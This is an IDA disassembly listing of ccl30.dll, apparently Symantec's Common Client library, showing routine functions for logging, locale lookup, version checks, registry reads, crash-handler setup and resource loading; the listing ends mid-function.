;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	0E5F5F271F33A90C4142A8C395D614D2
; Input	CRC32 :	F6043C71


		.686p
		.mmx
		.model flat

; ===========================================================================

; [00001000 BYTES: COLLAPSED SEGMENT HEADER. PRESS KEYPAD "+" TO EXPAND]
; File Name   :	C:\Users\farhadi\Desktop\dll\ccl30.dll
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	6AF30000
; Section 1. (virtual address 00001000)
; Virtual size			: 00022776 ( 141174.)
; Section size in file		: 00022800 ( 141312.)
; Offset to raw	data for section: 00000400
; Flags	60000020: Text Executable Readable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 6AF31000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing

; =============== S U B	R O U T	I N E =======================================


; BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
_DllMain@12	proc near		; CODE XREF: DllEntryPoint+6Cp

hinstDLL	= dword	ptr  4
fdwReason	= dword	ptr  8
lpvReserved	= dword	ptr  0Ch

		xor	eax, eax
		inc	eax
		retn	0Ch
_DllMain@12	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF31006(char	*Format, char Args)
sub_6AF31006	proc near		; CODE XREF: Ordinal188+FEp
					; Ordinal186+44p ...

Format		= dword	ptr  4
Args		= byte ptr  8

		lea	eax, [esp+Args]
		push	eax		; Args
		push	[esp+4+Format]	; Format
		mov	ecx, offset dword_6AF681F8
		call	Ordinal642
		retn
sub_6AF31006	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF3101A(char	*Format, char Args)
sub_6AF3101A	proc near		; CODE XREF: Ordinal188+25p
					; Ordinal186+1Ep ...

Format		= dword	ptr  4
Args		= byte ptr  8

		lea	eax, [esp+Args]
		push	eax		; Args
		push	[esp+4+Format]	; Format
		mov	ecx, offset dword_6AF681F8
		call	Ordinal644
		retn
sub_6AF3101A	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF3102E(char	*Format, char Args)
sub_6AF3102E	proc near		; CODE XREF: Ordinal131+4Dp
					; Ordinal132+4Ap ...

Format		= dword	ptr  4
Args		= byte ptr  8

		lea	eax, [esp+Args]
		push	eax		; Args
		push	[esp+4+Format]	; Format
		mov	ecx, offset dword_6AF681F8
		call	Ordinal646
		retn
sub_6AF3102E	endp

; Exported entry 128.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal128
Ordinal128	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, offset dword_6AF681F8
		retn
Ordinal128	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF31048	proc near		; DATA XREF: sub_6AF310AD:loc_6AF310ECo

LCData		= byte ptr -0Ch
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		mov	eax, ___security_cookie
		push	esi
		mov	[ebp+var_4], eax
		xor	esi, esi
		call	ds:GetThreadLocale
		push	7		; cchData
		lea	ecx, [ebp+LCData]
		push	ecx		; lpLCData
		push	1004h		; LCType
		push	eax		; Locale
		call	ds:GetLocaleInfoA
		test	eax, eax
		jz	short loc_6AF31094
		mov	cl, [ebp+LCData]
		test	cl, cl
		lea	eax, [ebp+LCData]
		jz	short loc_6AF31094

loc_6AF3107F:				; CODE XREF: sub_6AF31048+46j
		movsx	ecx, cl
		lea	edx, [esi+esi*4]
		inc	eax
		lea	esi, [ecx+edx*2-30h]
		mov	cl, [eax]
		test	cl, cl
		jnz	short loc_6AF3107F
		test	esi, esi
		jnz	short loc_6AF3109C

loc_6AF31094:				; CODE XREF: sub_6AF31048+2Bj
					; sub_6AF31048+35j
		call	ds:GetACP
		mov	esi, eax

loc_6AF3109C:				; CODE XREF: sub_6AF31048+4Aj
		mov	ecx, [ebp+var_4]
		mov	eax, esi
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn
sub_6AF31048	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF310A9	proc near		; DATA XREF: sub_6AF310AD+38o
		push	3
		pop	eax
		retn
sub_6AF310A9	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF310AD	proc near		; CODE XREF: sub_6AF310AD+50p
					; sub_6AF3158E+Fp ...

VersionInformation= _OSVERSIONINFOA ptr	-98h
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 98h
		mov	eax, ___security_cookie
		mov	[ebp+var_4], eax
		lea	eax, [ebp+VersionInformation]
		push	eax		; lpVersionInformation
		mov	[ebp+VersionInformation.dwOSVersionInfoSize], 94h
		call	ds:GetVersionExA
		cmp	[ebp+VersionInformation.dwPlatformId], 2
		jnz	short loc_6AF310EC
		cmp	[ebp+VersionInformation.dwMajorVersion], 5
		mov	eax, offset sub_6AF310A9
		jnb	short loc_6AF310F1

loc_6AF310EC:				; CODE XREF: sub_6AF310AD+2Fj
		mov	eax, offset sub_6AF31048

loc_6AF310F1:				; CODE XREF: sub_6AF310AD+3Dj
		push	eax		; Value
		push	offset Target	; Target
		call	ds:InterlockedExchange
		call	Target
		mov	ecx, [ebp+var_4]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn
sub_6AF310AD	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

sub_6AF3110D	proc near		; CODE XREF: sub_6AF3155D+20p
					; sub_6AF31583+5p ...

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		mov	[ebp+arg_0], eax
		push	offset dword_6AF61DCC
		lea	eax, [ebp+arg_0]
		push	eax
		call	_CxxThrowException
sub_6AF3110D	endp

; ---------------------------------------------------------------------------
		db 0CCh

; =============== S U B	R O U T	I N E =======================================


; int __fastcall sub_6AF31125(void *Dst)
sub_6AF31125	proc near		; CODE XREF: sub_6AF52426+6p
		push	esi
		push	18h		; Size
		mov	esi, ecx
		push	0		; Val
		push	esi		; Dst
		call	memset
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn
sub_6AF31125	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF31139	proc near		; CODE XREF: sub_6AF524A4+8Bp

var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h

		push	0Ch
		push	offset stru_6AF54530
		call	__SEH_prolog
		xor	esi, esi
		mov	[ebp+ms_exc.disabled], esi
		push	ecx		; lpCriticalSection
		call	ds:InitializeCriticalSection
		jmp	short loc_6AF3117D
; ---------------------------------------------------------------------------

loc_6AF31153:				; DATA XREF: .rdata:stru_6AF54530o
		mov	eax, [ebp+ms_exc.exc_ptr] ; Exception filter 0 for function 6AF31139
		mov	eax, [eax]
		mov	eax, [eax]
		mov	[ebp+var_1C], eax
		xor	eax, eax
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF31161:				; DATA XREF: .rdata:stru_6AF54530o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 6AF31139
		xor	eax, eax
		cmp	[ebp+var_1C], 0C0000017h
		setnz	al
		dec	eax
		and	eax, 6C009h
		add	eax, 80004005h
		mov	esi, eax

loc_6AF3117D:				; CODE XREF: sub_6AF31139+18j
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		mov	eax, esi
		call	__SEH_epilog
		retn
sub_6AF31139	endp

; Exported entry 129.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal129
Ordinal129	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal181
		mov	dword ptr [esi], offset	off_6AF5456C
		mov	eax, esi
		pop	esi
		retn
Ordinal129	endp

; Exported entry 130.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal130
Ordinal130	proc near		; CODE XREF: sub_6AF31267+3p
					; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF5456C
		jmp	Ordinal182
Ordinal130	endp

; Exported entry 131.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal131(LPBYTE lpData, LPDWORD lpcbData)
		public Ordinal131
Ordinal131	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
lpData		= dword	ptr  8
lpcbData	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		lea	ecx, [ebp+var_C]
		call	Ordinal988
		xor	ebx, ebx
		push	ebx		; int
		push	20019h		; samDesired
		push	offset aSoftwareSymant ; "Software\\Symantec\\Common Client"
		push	80000002h	; hKey
		lea	ecx, [ebp+var_C]
		call	Ordinal993
		test	eax, eax
		jz	short loc_6AF311EE
		push	[ebp+lpcbData]	; lpcbData
		lea	ecx, [ebp+var_C]
		push	[ebp+lpData]	; lpData
		push	offset ValueName ; "Version"
		call	Ordinal1002
		test	eax, eax
		jz	short loc_6AF311EE
		mov	bl, 1
		jmp	short loc_6AF311F9
; ---------------------------------------------------------------------------

loc_6AF311EE:				; CODE XREF: Ordinal131+2Bj
					; Ordinal131+42j
		push	offset aCcommonclienti ; "CCommonClientInfo::GetVersion() : reg.O"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF311F9:				; CODE XREF: Ordinal131+46j
		lea	ecx, [ebp+var_C]
		call	Ordinal990
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal131	endp

; Exported entry 132.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal132
Ordinal132	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		lea	ecx, [ebp+var_C]
		call	Ordinal988
		xor	ebx, ebx
		push	ebx		; int
		push	20019h		; samDesired
		push	offset aSoftwareSymant ; "Software\\Symantec\\Common Client"
		push	80000002h	; hKey
		lea	ecx, [ebp+var_C]
		call	Ordinal993
		test	eax, eax
		jz	short loc_6AF3124D
		push	[ebp+arg_0]	; int
		lea	ecx, [ebp+var_C]
		push	offset ValueName ; "Version"
		call	Ordinal1003
		test	eax, eax
		jz	short loc_6AF3124D
		mov	bl, 1
		jmp	short loc_6AF31258
; ---------------------------------------------------------------------------

loc_6AF3124D:				; CODE XREF: Ordinal132+2Bj
					; Ordinal132+3Fj
		push	offset aCcommonclienti ; "CCommonClientInfo::GetVersion() : reg.O"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF31258:				; CODE XREF: Ordinal132+43j
		lea	ecx, [ebp+var_C]
		call	Ordinal990
		mov	al, bl
		pop	ebx
		leave
		retn	4
Ordinal132	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF31267(void *, char)
sub_6AF31267	proc near		; DATA XREF: .rdata:off_6AF5456Co

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal130
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3127D
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3127D:				; CODE XREF: sub_6AF31267+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF31267	endp

; Exported entry 133.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal133
Ordinal133	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal560
		mov	dword ptr [esi], offset	off_6AF545A8
		mov	eax, esi
		pop	esi
		retn
Ordinal133	endp

; Exported entry 134.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal134
Ordinal134	proc near		; CODE XREF: sub_6AF312D2+3p
					; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF545A8
		jmp	Ordinal561
Ordinal134	endp

; Exported entry 136.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal136
Ordinal136	proc near		; CODE XREF: Ordinal135+41p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		mov	ecx, [ebp+arg_0]
		push	esi
		call	Ordinal148
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	4
Ordinal136	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF312D2(void *, char)
sub_6AF312D2	proc near		; DATA XREF: .rdata:off_6AF545A8o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal134
		test	[esp+4+arg_0], 1
		jz	short loc_6AF312E8
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF312E8:				; CODE XREF: sub_6AF312D2+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF312D2	endp

; Exported entry 135.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal135
Ordinal135	proc near		; DATA XREF: .rdata:off_6AF66098o

var_78		= byte ptr -78h
var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 78h
		push	esi
		mov	esi, ecx
		lea	eax, [esi+90h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1229
		lea	ecx, [ebp+var_78]
		call	Ordinal137
		lea	ecx, [ebp+var_78]
		call	Ordinal143
		test	eax, eax
		jnz	short loc_6AF31329
		push	offset aCcrashhandlerL ; "CCrashHandler::LoadOptions() : debugOpt"...

loc_6AF3131F:				; CODE XREF: Ordinal135+4Fj
					; Ordinal135+61j
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF31354
; ---------------------------------------------------------------------------

loc_6AF31329:				; CODE XREF: Ordinal135+2Aj
		lea	eax, [ebp+var_78]
		push	eax
		mov	ecx, esi
		call	Ordinal136
		test	eax, eax
		jnz	short loc_6AF3133F
		push	offset aCcrashhandle_0 ; "CCrashHandler::LoadOptions() : SetOptio"...
		jmp	short loc_6AF3131F
; ---------------------------------------------------------------------------

loc_6AF3133F:				; CODE XREF: Ordinal135+48j
		mov	ecx, esi
		call	Ordinal562
		test	eax, eax
		jnz	short loc_6AF31351
		push	offset aCcrashhandle_1 ; "CCrashHandler::LoadOptions() : Enable()"...
		jmp	short loc_6AF3131F
; ---------------------------------------------------------------------------

loc_6AF31351:				; CODE XREF: Ordinal135+5Aj
		xor	esi, esi
		inc	esi

loc_6AF31354:				; CODE XREF: Ordinal135+39j
		lea	ecx, [ebp+var_78]
		call	Ordinal140
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal135	endp

; Exported entry 1105.
; Exported entry 1161.
; Exported entry 1162.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1162
Ordinal1162	proc near		; CODE XREF: sub_6AF52D6C+6p
					; sub_6AF530E0+6p
					; DATA XREF: ...
		retn			; ccL30_1105
Ordinal1162	endp			; ccL30_1161


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3136A	proc near		; CODE XREF: sub_6AF31CCD+34p
					; sub_6AF31E92+35p ...

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_21 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	esi
		mov	esi, ecx
		mov	[ebp+var_10], esi
		call	ds:??0exception@@QAE@XZ	; exception::exception(void)
		push	[ebp+arg_0]
		and	[ebp+var_4], 0
		lea	ecx, [esi+0Ch]
		mov	dword ptr [esi], offset	off_6AF54890
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z	; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>> const &)
		mov	ecx, [ebp+var_C]
		mov	eax, esi
		pop	esi
		mov	large fs:0, ecx
		leave
		retn	4
sub_6AF3136A	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF313A8	proc near		; CODE XREF: sub_6AF313F3+3p
					; sub_6AF3142B+6j ...

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_21 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	esi
		mov	esi, ecx
		mov	[ebp+var_10], esi
		mov	dword ptr [esi], offset	off_6AF54890
		and	[ebp+var_4], 0
		lea	ecx, [esi+0Ch]
		call	ds:??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(void)
		or	[ebp+var_4], 0FFFFFFFFh
		mov	ecx, esi
		call	ds:??1exception@@UAE@XZ	; exception::~exception(void)
		mov	ecx, [ebp+var_C]
		pop	esi
		mov	large fs:0, ecx
		leave
		retn
sub_6AF313A8	endp

; [0000000E BYTES: COLLAPSED FUNCTION unknown_libname_1. PRESS KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF313F3(void *, char)
sub_6AF313F3	proc near		; DATA XREF: .rdata:off_6AF54890o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	sub_6AF313A8
		test	[esp+4+arg_0], 1
		jz	short loc_6AF31409
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF31409:				; CODE XREF: sub_6AF313F3+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF313F3	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3140F(void *, char)
sub_6AF3140F	proc near		; DATA XREF: .rdata:off_6AF54898o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	sub_6AF3142B
		test	[esp+4+arg_0], 1
		jz	short loc_6AF31425
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF31425:				; CODE XREF: sub_6AF3140F+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3140F	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3142B	proc near		; CODE XREF: sub_6AF3140F+3p
					; DATA XREF: .rdata:6AF61E9Co
		mov	dword ptr [ecx], offset	off_6AF54898
		jmp	sub_6AF313A8
sub_6AF3142B	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF31436(void *, char)
sub_6AF31436	proc near		; DATA XREF: .rdata:off_6AF548A0o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	sub_6AF31452
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3144C
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3144C:				; CODE XREF: sub_6AF31436+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF31436	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF31452	proc near		; CODE XREF: sub_6AF31436+3p
					; DATA XREF: .rdata:6AF61F20o
		mov	dword ptr [ecx], offset	off_6AF548A0
		jmp	sub_6AF313A8
sub_6AF31452	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_6AF3145D(HMODULE hModule, HRSRC hResInfo, int)
sub_6AF3145D	proc near		; CODE XREF: sub_6AF314B9+26p
					; sub_6AF314E8+29p

hModule		= dword	ptr  8
hResInfo	= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	[ebp+hResInfo]	; hResInfo
		push	[ebp+hModule]	; hModule
		call	ds:LoadResource
		test	eax, eax
		jnz	short loc_6AF31472
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_6AF31472:				; CODE XREF: sub_6AF3145D+11j
		push	esi
		push	eax		; hResData
		call	ds:LockResource
		mov	esi, eax
		test	esi, esi
		jnz	short loc_6AF31484

loc_6AF31480:				; CODE XREF: sub_6AF3145D+3Fj
					; sub_6AF3145D+4Dj
		xor	eax, eax
		jmp	short loc_6AF314B6
; ---------------------------------------------------------------------------

loc_6AF31484:				; CODE XREF: sub_6AF3145D+21j
		push	[ebp+hResInfo]	; hResInfo
		push	[ebp+hModule]	; hModule
		call	ds:SizeofResource
		mov	ecx, [ebp+arg_8]
		add	eax, esi
		and	ecx, 0Fh
		jbe	short loc_6AF314A8

loc_6AF3149A:				; CODE XREF: sub_6AF3145D+49j
		cmp	esi, eax
		jnb	short loc_6AF31480
		dec	ecx
		movzx	edx, word ptr [esi]
		lea	esi, [esi+edx*2+2]
		jnz	short loc_6AF3149A

loc_6AF314A8:				; CODE XREF: sub_6AF3145D+3Bj
		cmp	esi, eax
		jnb	short loc_6AF31480
		mov	ax, [esi]
		neg	ax
		sbb	eax, eax
		and	eax, esi

loc_6AF314B6:				; CODE XREF: sub_6AF3145D+25j
		pop	esi
		pop	ebp
		retn
sub_6AF3145D	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF314B9(HMODULE hModule, int)
sub_6AF314B9	proc near		; CODE XREF: sub_6AF31AC4+Ep

hModule		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_4]
		shr	eax, 4
		inc	eax
		movzx	eax, ax
		push	6		; lpType
		push	eax		; lpName
		push	[esp+8+hModule]	; hModule
		call	ds:FindResourceA
		test	eax, eax
		jnz	short loc_6AF314D6
		retn
; ---------------------------------------------------------------------------

loc_6AF314D6:				; CODE XREF: sub_6AF314B9+1Aj
		push	[esp+arg_4]	; int
		push	eax		; hResInfo
		push	[esp+8+hModule]	; hModule
		call	sub_6AF3145D
		add	esp, 0Ch
		retn
sub_6AF314B9	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_6AF314E8(HMODULE hModule, int, WORD wLanguage)
sub_6AF314E8	proc near		; CODE XREF: sub_6AF3151B+1Fp

hModule		= dword	ptr  8
arg_4		= dword	ptr  0Ch
wLanguage	= word ptr  10h

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_4]
		push	dword ptr [ebp+wLanguage] ; wLanguage
		shr	eax, 4
		inc	eax
		movzx	eax, ax
		push	eax		; lpName
		push	6		; lpType
		push	[ebp+hModule]	; hModule
		call	ds:FindResourceExA
		test	eax, eax
		jnz	short loc_6AF3150A
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_6AF3150A:				; CODE XREF: sub_6AF314E8+1Ej
		push	[ebp+arg_4]	; int
		push	eax		; hResInfo
		push	[ebp+hModule]	; hModule
		call	sub_6AF3145D
		add	esp, 0Ch
		pop	ebp
		retn
sub_6AF314E8	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF3151B(int,	WORD wLanguage)
sub_6AF3151B	proc near		; CODE XREF: sub_6AF31CA9+9p

arg_0		= dword	ptr  4
wLanguage	= word ptr  8

		push	ebx
		push	esi
		push	edi
		mov	esi, offset dword_6AF68284
		push	0
		mov	ecx, esi
		call	sub_6AF52456
		xor	ebx, ebx
		inc	ebx
		jmp	short loc_6AF3154F
; ---------------------------------------------------------------------------

loc_6AF31531:				; CODE XREF: sub_6AF3151B+38j
		push	dword ptr [esp+0Ch+wLanguage] ;	wLanguage
		push	[esp+10h+arg_0]	; int
		push	edi		; hModule
		call	sub_6AF314E8
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_6AF31559
		push	ebx
		mov	ecx, esi
		call	sub_6AF52456
		inc	ebx

loc_6AF3154F:				; CODE XREF: sub_6AF3151B+14j
		mov	edi, eax
		test	edi, edi
		jnz	short loc_6AF31531

loc_6AF31555:				; CODE XREF: sub_6AF3151B+40j
		pop	edi
		pop	esi
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_6AF31559:				; CODE XREF: sub_6AF3151B+29j
		mov	eax, edi
		jmp	short loc_6AF31555
sub_6AF3151B	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3155D	proc near		; CODE XREF: sub_6AF31A5C+5Dp
					; sub_6AF31AC4+4Ap ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		test	eax, eax
		jl	short loc_6AF31578
		mov	edx, [ecx]
		cmp	eax, [edx-8]
		jg	short loc_6AF31578
		mov	[edx-0Ch], eax
		mov	ecx, [ecx]
		mov	byte ptr [eax+ecx], 0
		retn	4
; ---------------------------------------------------------------------------

loc_6AF31578:				; CODE XREF: sub_6AF3155D+6j
					; sub_6AF3155D+Dj
		push	80070057h
		call	sub_6AF3110D
sub_6AF3155D	endp

; ---------------------------------------------------------------------------
		db 0CCh

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

sub_6AF31583	proc near		; CODE XREF: sub_6AF31627+35j
					; sub_6AF31719+2Ep ...
		push	8007000Eh
		call	sub_6AF3110D
sub_6AF31583	endp

; ---------------------------------------------------------------------------
		align 2

; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF3158E(LPCWSTR lpWideCharStr, int cchWideChar)
sub_6AF3158E	proc near		; CODE XREF: sub_6AF31AC4+25p

lpWideCharStr	= dword	ptr  4
cchWideChar	= dword	ptr  8

		xor	eax, eax
		push	eax		; lpUsedDefaultChar
		push	eax		; lpDefaultChar
		push	eax		; cbMultiByte
		push	eax		; lpMultiByteStr
		push	[esp+10h+cchWideChar] ;	cchWideChar
		push	[esp+14h+lpWideCharStr]	; lpWideCharStr
		push	eax		; dwFlags
		call	Target
		push	eax		; CodePage
		call	ds:WideCharToMultiByte
		retn
sub_6AF3158E	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF315AB(LPSTR lpMultiByteStr, int cbMultiByte, LPCWSTR lpWideCharStr, int cchWideChar)
sub_6AF315AB	proc near		; CODE XREF: sub_6AF31AC4+3Ep
					; sub_6AF381EE+2Bp

lpMultiByteStr	= dword	ptr  4
cbMultiByte	= dword	ptr  8
lpWideCharStr	= dword	ptr  0Ch
cchWideChar	= dword	ptr  10h

		xor	eax, eax
		push	eax		; lpUsedDefaultChar
		push	eax		; lpDefaultChar
		push	[esp+8+cbMultiByte] ; cbMultiByte
		push	[esp+0Ch+lpMultiByteStr] ; lpMultiByteStr
		push	[esp+10h+cchWideChar] ;	cchWideChar
		push	[esp+14h+lpWideCharStr]	; lpWideCharStr
		push	eax		; dwFlags
		call	Target
		push	eax		; CodePage
		call	ds:WideCharToMultiByte
		retn
sub_6AF315AB	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF315CE	proc near		; CODE XREF: sub_6AF321FB+6Ep
					; sub_6AF32680+93p ...
		mov	eax, [ecx]
		push	ebx
		xor	bl, bl
		cmp	[eax+15h], bl
		jz	short loc_6AF315DD
		mov	eax, [eax+8]
		jmp	short loc_6AF31609
; ---------------------------------------------------------------------------

loc_6AF315DD:				; CODE XREF: sub_6AF315CE+8j
		mov	edx, [eax]
		cmp	[edx+15h], bl
		jnz	short loc_6AF315FC
		jmp	short loc_6AF315E8
; ---------------------------------------------------------------------------

loc_6AF315E6:				; CODE XREF: sub_6AF315CE+20j
		mov	edx, eax

loc_6AF315E8:				; CODE XREF: sub_6AF315CE+16j
		mov	eax, [edx+8]
		cmp	[eax+15h], bl
		jz	short loc_6AF315E6
		mov	[ecx], edx
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_6AF315F4:				; CODE XREF: sub_6AF315CE+34j
		mov	edx, [ecx]
		cmp	edx, [eax]
		jnz	short loc_6AF31604
		mov	[ecx], eax

loc_6AF315FC:				; CODE XREF: sub_6AF315CE+14j
		mov	eax, [eax+4]
		cmp	[eax+15h], bl
		jz	short loc_6AF315F4

loc_6AF31604:				; CODE XREF: sub_6AF315CE+2Aj
		cmp	[eax+15h], bl
		jnz	short loc_6AF3160B

loc_6AF31609:				; CODE XREF: sub_6AF315CE+Dj
		mov	[ecx], eax

loc_6AF3160B:				; CODE XREF: sub_6AF315CE+39j
		pop	ebx
		retn
sub_6AF315CE	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3160D	proc near		; CODE XREF: sub_6AF31719+56p
					; sub_6AF317A8:loc_6AF317D7p ...
		lea	eax, [ecx+0Ch]
		or	edx, 0FFFFFFFFh
		lock xadd [eax], edx
		dec	edx
		test	edx, edx
		jg	short locret_6AF31626
		mov	eax, [ecx]
		mov	edx, [eax]
		push	ecx
		mov	ecx, eax
		call	dword ptr [edx+4]

locret_6AF31626:			; CODE XREF: sub_6AF3160D+Dj
		retn
sub_6AF3160D	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF31627	proc near		; CODE XREF: sub_6AF316B7+Dp
					; sub_6AF31C41+24p

